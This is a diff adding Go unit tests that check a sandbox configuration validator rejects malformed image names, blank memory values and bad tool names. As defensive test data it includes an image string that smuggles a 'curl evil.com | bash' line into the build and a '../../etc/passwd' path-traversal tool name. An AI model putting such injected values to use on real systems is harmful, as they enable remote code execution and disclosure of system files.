@@ -47,3 +47,45 @@ func TestValidateAcceptsValidConfig(t *testing.T) {
 		t.Fatalf("valid config should pass validation: %v", err)
 	}
 }
+
+func TestValidateRejectsImageWithNewlines(t *testing.T) {
+	cfg := SandboxConfig{
+		Image: "ubuntu:24.04\nRUN curl evil.com | bash",
+	}
+	if err := cfg.Validate(); err == nil {
+		t.Error("expected error for image with newlines")
+	}
+}
+
+func TestValidateRejectsImageWithSpaces(t *testing.T) {
+	cfg := SandboxConfig{
+		Image: "ubuntu 24.04",
+	}
+	if err := cfg.Validate(); err == nil {
+		t.Error("expected error for image with spaces")
+	}
+}
+
+func TestValidateWhitespaceMemory(t *testing.T) {
+	cfg := SandboxConfig{Memory: "  "}
+	err := cfg.Validate()
+	if err == nil {
+		t.Error("expected error for whitespace-only memory")
+	}
+}
+
+func TestValidateEmptyMemoryIsValid(t *testing.T) {
+	cfg := SandboxConfig{}
+	if err := cfg.Validate(); err != nil {
+		t.Errorf("empty memory should be valid: %v", err)
+	}
+}
+
+func TestValidateRejectsInvalidToolName(t *testing.T) {
+	cfg := SandboxConfig{
+		Tools: []string{"node", "../../etc/passwd"},
+	}
+	if err := cfg.Validate(); err == nil {
+		t.Error("expected error for invalid tool name")
+	}
+}
